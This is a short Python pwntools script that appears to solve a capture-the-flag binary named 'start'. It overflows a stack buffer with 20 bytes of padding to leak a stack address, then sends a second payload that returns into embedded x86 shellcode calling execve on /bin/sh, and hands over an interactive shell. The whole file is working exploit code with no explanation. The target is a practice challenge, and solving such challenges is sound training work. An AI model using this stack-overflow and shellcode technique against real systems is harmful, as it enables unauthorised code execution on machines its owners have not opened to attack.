from pwn import *

context.binary=ELF('./start')
io=process('./start')

def pwn():
    shellcode=asm("xor edx,edx")+asm("xor ecx,ecx")+asm("mov al,0xb")+"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    #pl1=shellcode+p32(0x804809C)+p8(0x84)
 
    #io.send(pl1)
    
    pl2='a'*20+p32(0x8048087)
    io.send(pl2)
    stack=u32(io.recv(4))
    print(hex(stack))
    pl3='a'*20+p32(stack+20)+shellcode
    io.send(pl3)
    
    io.interactive()

pwn()
